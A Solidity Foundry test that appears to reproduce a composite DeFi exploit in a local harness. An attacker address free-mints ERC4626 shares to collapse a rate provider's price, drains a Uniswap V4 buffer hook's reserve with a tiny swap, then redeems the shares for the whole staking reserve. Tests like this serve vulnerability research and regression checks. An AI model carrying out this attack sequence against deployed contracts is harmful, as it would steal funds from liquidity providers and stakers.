// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {ExchangeInAmount} from "contracts/utils/ExchangeInAmount.sol";

import {console2} from "forge-std/console2.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IERC4626} from "@crane/contracts/interfaces/IERC4626.sol";
import {IStandardExchangeIn} from "@crane/contracts/interfaces/IStandardExchangeIn.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {TickMath} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/TickMath.sol";
import {
    UniswapV4SingleStandardExchangeBufferConstantProductHook_SeMatrixBehavior
} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/constantProduct/single/UniswapV4SingleStandardExchangeBufferConstantProductHook_SeMatrixBehavior.sol";
import {SeMatrix_EtherFiFixture} from
    "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrix_EtherFiFixture.sol";
import {SeMatrixFixture} from "test/foundry/spec/hooks/uniswap/v4/standardExchange/SeMatrixFixture.sol";
import {ICreate3FactoryProxy} from "@crane/contracts/interfaces/proxies/ICreate3FactoryProxy.sol";
import {VaultComponentFactoryService} from "contracts/vaults/VaultComponentFactoryService.sol";

/**
 * @title ChainFreeMintAmplify
 * @notice Composite exploit: crane-erc4626facet free-mint (zero-capital mint of 100% of the
 *         staking SE reserve) + the SE being USED as the buffered leg of a UniswapV4 single-CP
 *         buffer hook. The hook prices its pair (WETH) leg as hook SE-share balance x rate-provider
 *         getRate, and getRate = full-book reserve / SE totalSupply. The free-mint inflates
 *         totalSupply with NO transfer, so getRate -> ~0, the hook's WETH-leg NAV collapses, and a
 *         tiny WETH-in swap drains the hook's entire rawToken reserve. On top of that the attacker
 *         redeems the free shares for the whole SE reserve. Composite loot = SE reserve (crane
 *         primitive) + hook rawToken reserve (new value the single primitive cannot reach).
 */
contract ChainFreeMintAmplify_Test is UniswapV4SingleStandardExchangeBufferConstantProductHook_SeMatrixBehavior {
    address internal sharedPkg;
    using VaultComponentFactoryService for ICreate3FactoryProxy;

    address internal constant ATK = address(0xA11CE);

    /// @dev Production parity: the Robinhood deploy (scripts/foundry/anvil_robinhood_main/
    ///      Phase_03_Stage_01_CommonFacets.sol:22) and TestBase_EtherFiWeETHStandardExchange wire the
    ///      GENERIC Crane ERC4626Facet into the EtherFi package. The hook matrix base inherits
    ///      TestBase_ERC4626StandardExchange, which swaps in ReceiptBackedERC4626Facet (reverts
    ///      UnsupportedAccountingFamily on non-ERC4626/Stata SEs). Restore the production facet
    ///      before the EtherFi package is built. Setup-only; no mid-attack cheats.
    function _newFixture() internal override returns (SeMatrixFixture) {
        erc4626Facet = create3Factory.deployERC4626Facet();
        SeMatrix_EtherFiFixture f = new SeMatrix_EtherFiFixture(_ctx(), sharedPkg);
        sharedPkg = f.pkg();
        return f;
    }
    uint256 internal constant STAKE = 1 ether;

    address internal assetTok;
    uint256 internal seReserveBefore;
    uint256 internal hookRawBefore;
    uint256 internal hookSeShares;
    uint256 internal minted;
    uint256 internal rawDrained;
    uint256 internal seDrained;
    uint256 internal wethLegNavBefore;
    uint256 internal rawLootValueWeth;
    uint256 internal netCompositeLoot;
    uint256 internal weEthRate;
    uint256 internal hookNavAfter;
    uint256 internal hookRawAfter;
    uint256 internal atkProfitWeth;
    uint256 internal singlePrimitiveWeth;

    function _snapshotBefore() internal {
        assetTok = address(SeMatrix_EtherFiFixture(address(fx)).weEth());
        seReserveBefore = IERC20(assetTok).balanceOf(seUT);
        hookRawBefore = IERC20(raw).balanceOf(hook);
        hookSeShares = IERC20(seUT).balanceOf(hook);// honest pre-attack valuation of the hook's WETH leg (SE shares -> WETH at the honest rate)
        (wethLegNavBefore,) = IStandardExchangeIn(seUT).previewExchangeIn(IERC20(seUT), hookSeShares, IERC20(face));
    }

    function _freeMint() internal {
        uint256 w = IERC20(assetTok).balanceOf(seUT);
        vm.prank(ATK);
        minted = IERC4626(seUT).deposit(w, ATK);
    }

    function _drainRaw() internal {
        uint256 before = IERC20(raw).balanceOf(ATK);
        bool zfo = face < raw;
        SwapParams memory p = SwapParams({
            zeroForOne: zfo,
            amountSpecified: -int256(STAKE),
            sqrtPriceLimitX96: zfo ? TickMath.MIN_SQRT_PRICE + 1 : TickMath.MAX_SQRT_PRICE - 1
        });
        vm.startPrank(ATK);
        IERC20(face).approve(address(swapRouter), type(uint256).max);
        swapRouter.swapExactIn(poolKey, p, "");
        vm.stopPrank();
        rawDrained = IERC20(raw).balanceOf(ATK) - before;
    }

    function _redeemSe() internal {
        uint256 before = IERC20(assetTok).balanceOf(ATK);
        vm.prank(ATK);
        IERC4626(seUT).redeem(minted, ATK, ATK);
        seDrained = IERC20(assetTok).balanceOf(ATK) - before;
    }

    function _computeLoot() internal {
        rawLootValueWeth = hookRawBefore == 0 ? 0 : (rawDrained * wethLegNavBefore) / hookRawBefore;
        netCompositeLoot = seDrained + rawLootValueWeth;
        netCompositeLoot = netCompositeLoot > STAKE ? netCompositeLoot - STAKE : 0;
    }

    function _logLoot() internal view {
        console2.log("SE reserve (weETH) before          ", seReserveBefore);
        console2.log("hook raw reserve before            ", hookRawBefore);
        console2.log("hook SE shares (WETH leg)          ", hookSeShares);
        console2.log("attacker free-minted SE shares     ", minted);
        console2.log("attacker raw drained               ", rawDrained);
        console2.log("attacker weETH redeemed from SE    ", seDrained);
        console2.log("honest hook WETH-leg NAV (weETH-eq)", wethLegNavBefore);
        console2.log("raw loot valued in weETH-eq        ", rawLootValueWeth);
        console2.log("COMPOSITE loot (weETH-eq, net)     ", netCompositeLoot);
    }

    /// @dev Fair-price valuation in WETH: weETH at the hermetic weETH.getRate(); raw at the honest
    ///      seeded pool price (hook WETH-leg NAV / hook raw reserve before the attack).
    function _fairValue() internal {
        weEthRate = SeMatrix_EtherFiFixture(address(fx)).weEth().getRate();
        uint256 seWeth = (seDrained * weEthRate) / 1e18;
        atkProfitWeth = seWeth + rawLootValueWeth - STAKE;
        // best single primitive = crane free mint + redeem alone = whole SE weETH reserve
        singlePrimitiveWeth = (seReserveBefore * weEthRate) / 1e18;
        hookRawAfter = IERC20(raw).balanceOf(hook);
        uint256 sh = IERC20(seUT).balanceOf(hook);hookNavAfter = sh == 0 ? 0 : ExchangeInAmount.previewOut(IStandardExchangeIn(seUT), IERC20(seUT), sh, IERC20(face));
        console2.log("weETH rate                          ", weEthRate);
        console2.log("attacker net profit (WETH, fair)    ", atkProfitWeth);
        console2.log("best single primitive (WETH)        ", singlePrimitiveWeth);
        console2.log("hook raw after                      ", hookRawAfter);
        console2.log("hook WETH-leg NAV after (WETH)      ", hookNavAfter);
    }

    function _assertLoot() internal view {
        assertGt(atkProfitWeth, singlePrimitiveWeth + 90 ether, "fair-price composite > single primitive by ~hook raw");
        assertLt(hookRawAfter, 1 ether, "honest LP's raw leg drained");
        assertLt(hookNavAfter, wethLegNavBefore / 2, "honest LP's WETH leg lost value");
        assertGt(seDrained, (seReserveBefore * 99) / 100, "crane free-mint drained ~100% of SE reserve");
        assertGt(rawDrained, (hookRawBefore * 90) / 100, "composite drained >90% of hook raw reserve for ~0 cost");
        assertGt(netCompositeLoot, seReserveBefore, "COMPOSITE exceeds best single primitive");
    }

    function test_composite_freeMintAmplify() public {
        _seed(); // honest LP (user=0xBEEF) seeds the buffer hook
        _snapshotBefore();
        fx.fund(ATK, STAKE); // attacker's 1 WETH capital, funded pre-attack (counted as cost)
        _freeMint(); // 1) zero-capital free mint -> inflates SE totalSupply, collapses hook NAV
        _drainRaw(); // 2) tiny WETH-in swap drains hook rawToken reserve
        _redeemSe(); // 3) redeem free shares for whole SE reserve
        _computeLoot();
        _logLoot();
        _fairValue();
        _assertLoot();
    }
}
